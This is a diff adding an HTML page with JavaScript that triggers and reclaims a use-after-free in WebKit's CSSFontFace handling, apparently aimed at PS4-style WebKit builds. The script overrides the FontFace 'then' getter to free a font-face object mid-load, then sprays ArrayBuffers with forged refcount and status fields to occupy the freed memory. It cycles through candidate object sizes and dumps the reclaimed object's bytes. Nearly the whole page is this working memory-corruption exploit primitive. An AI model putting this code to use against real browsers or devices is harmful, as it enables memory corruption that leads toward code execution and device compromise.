@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CSSFontFace UAF probe</title>
+<style>
+  body { margin:0; padding:20px; background:#0b0e14; color:#d7dce5;
+         font-family: system-ui, sans-serif; }
+  #o { white-space:pre-wrap; font:13px/1.5 ui-monospace, monospace; color:#9fb4d6; }
+  #v { font-size:56px; font-weight:700; }
+</style>
+</head>
+<body>
+  <div id="v">UAF</div>
+  <pre id="o">starting…</pre>
+  <script>
+  "use strict";
+  var out = document.getElementById("o");
+  function log(s) { out.textContent += s + "\n"; }
+
+  // (size, m_status offset) candidates: PS4 published values first, then plausible
+  // neighbours for a different WebKit build.
+  var CANDIDATES = [
+    { s: 0xb8,  st: 0x82 },
+    { s: 0xe8,  st: 0x9a },
+    { s: 0x120, st: 0x118 },
+    { s: 0x128, st: 0x120 },
+    { s: 0xa0,  st: 0x98 },
+    { s: 0xa8,  st: 0xa0 },
+    { s: 0xb0,  st: 0xa8 },
+    { s: 0xc0,  st: 0xb8 },
+    { s: 0xc8,  st: 0xc0 },
+    { s: 0xd0,  st: 0xc8 },
+    { s: 0xd8,  st: 0xd0 },
+    { s: 0xe0,  st: 0xd8 },
+    { s: 0xf0,  st: 0xe8 },
+    { s: 0xf8,  st: 0xf0 },
+    { s: 0x100, st: 0xf8 },
+    { s: 0x108, st: 0x100 },
+    { s: 0x110, st: 0x108 },
+    { s: 0x118, st: 0x110 },
+    { s: 0x130, st: 0x128 },
+    { s: 0x138, st: 0x130 },
+    { s: 0x140, st: 0x138 }
+  ];
+
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  async function tryUAF(size, status) {
+    var spray = 0xb0;
+    var spray_rule = "@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }";
+    var uaf_rule = "@font-face { font-family: b; src: url(nonexistent-font.woff); unicode-range: U+0042; }";
+    var abs = new Array(spray);
+    var A;
+    try { A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" }); }
+    catch (e) { return { err: "FontFace ctor: " + e.message }; }
+    document.fonts.add(A);
+    void A.loaded;
+
+    var style = document.createElement("style");
+    document.head.appendChild(style);
+    for (var i = 0; i < spray / 4; i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
+    var idx = style.sheet.cssRules.length;
+    style.sheet.insertRule(uaf_rule, style.sheet.cssRules.length);
+    for (var i2 = spray / 4; i2 < spray; i2++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
+    void document.body.offsetTop;
+
+    var old_then = FontFace.prototype.then;
+    var freed = false;
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      get: function () {
+        if (this === A && !freed) {
+          freed = true;
+          style.sheet.deleteRule(idx);
+          void document.body.offsetTop;
+          for (var k = style.sheet.cssRules.length - 1; k >= 0; k--) {
+            if (style.sheet.cssRules[k].cssText.indexOf("spray") !== -1) style.sheet.deleteRule(k);
+          }
+          void document.body.offsetTop;
+          for (var j = 0; j < abs.length; j++) {
+            var ab = new ArrayBuffer(size);
+            var v = new DataView(ab);
+            try { v.setUint32(8, 1, true); v.setUint32(12, 0, true); v.setUint8(status, 3); } catch (e) {}
+            abs[j] = ab;
+          }
+        }
+        return undefined;
+      }
+    });
+
+    var fonts = [];
+    try { fonts = await document.fonts.load("1em a, b", "AB"); } catch (e) {}
+    Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
+
+    if (!fonts || fonts.length !== 2) return { err: "load=" + (fonts ? fonts.length : 0) };
+
+    var font = null;
+    for (var n = 0; n < fonts.length; n++) {
+      if (fonts[n].unicodeRange === "U+0-10FFFF") { font = fonts[n]; break; }
+    }
+    if (!font) return { err: "no UAF FontFace" };
+
+    var ab = null;
+    for (var m = 0; m < abs.length; m++) {
+      try {
+        var dv = new DataView(abs[m]);
+        if (dv.getUint32(8, true) === 2 && dv.getUint32(12, true) === 0) { ab = abs[m]; break; }
+      } catch (e) {}
+    }
+    return { font: font, ab: ab };
+  }
+
+  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
+  function annotate(ab) {
+    var u = new Uint8Array(ab), lines = [];
+    for (var i = 0; i + 8 <= u.length; i += 8) {
+      var lo = (u[i] | u[i+1]<<8 | u[i+2]<<16 | u[i+3]<<24) >>> 0;
+      var hi = (u[i+4] | u[i+5]<<8 | u[i+6]<<16 | u[i+7]<<24) >>> 0;
+      var tag = "";
+      if (hi === 0 && lo === 0) tag = "   0";
+      else if (hi === 0) tag = "   ptr?";
+      else tag = "   0x" + hex8(hi);
+      lines.push("+" + ("000" + i.toString(16)).slice(-3) + "  " + hex8(hi) + " " + hex8(lo) + tag);
+    }
+    return lines.join("\n");
+  }
+
+  function dump(ab, n) {
+    var u = new Uint8Array(ab), lines = [];
+    for (var i = 0; i < Math.min(n, u.length); i += 8) {
+      var h = "";
+      for (var j = 0; j < 8 && i + j < u.length; j++) h += ("0" + u[i + j].toString(16)).slice(-2) + " ";
+      lines.push(("0000" + i.toString(16)).slice(-4) + "  " + h);
+    }
+    return lines.join("\n");
+  }
+
+  async function run() {
+    if (typeof FontFace === "undefined" || !document.fonts || !document.fonts.load) {
+      log("FontFace/FontFaceSet not available");
+      return;
+    }
+    log("UA: " + navigator.userAgent);
+    for (var i = 0; i < CANDIDATES.length; i++) {
+      var c = CANDIDATES[i];
+      var tag = "size=0x" + c.s.toString(16) + " status=0x" + c.st.toString(16) + " -> ";
+      try {
+        var r = await tryUAF(c.s, c.st);
+        if (r.font) {
+          log(tag + "UAF RECLAIM" + (r.ab ? " (ArrayBuffer refcount 2)" : " (no AB match)"));
+          if (r.ab) { log("object bytes:\n" + dump(r.ab, r.ab.byteLength)); log("qword map:\n" + annotate(r.ab)); }
+          document.getElementById("v").textContent = "UAF @0x" + c.s.toString(16);
+          return;
+        }
+        log(tag + (r.err || "no match"));
+      } catch (e) {
+        log(tag + "error: " + (e && e.message ? e.message : e));
+      }
+      await sleep(200);
+    }
+    log("done");
+  }
+
+  run();
+  </script>
+</body>
+</html>
